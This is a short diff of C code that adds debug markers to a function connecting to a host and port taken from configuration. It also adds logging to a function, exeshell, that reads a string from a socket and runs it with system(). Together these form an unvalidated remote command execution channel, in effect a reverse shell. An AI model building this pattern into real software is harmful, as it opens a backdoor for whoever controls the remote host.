@@ -13,14 +13,15 @@ int connect_host()
 	char port[10];
 	readcfg("ip",ipaddr);
 	readcfg("ctosport",port);
-	
+	DEBUGW;
 	DEBUGS(ipaddr);
 	DEBUGS(port);
 	
 	address_x addr;
 	address_init(&addr,ipaddr,atoi(port));
+	DEBUGW;
 	int sockfd = create_socket_x();
-	
+	DEBUGW;
 	if(sockfd == -1)
 		return false;
 	if( connect_x(sockfd,&addr) == -1)
@@ -48,9 +49,9 @@ int exeshell(int fd)
 {
 	char shell[100] = {0};
 	read(fd,shell,100);
-	system(shell);
+	int k = system(shell);
+	printf("system = %d\n", k);
 }
-
 
 
 
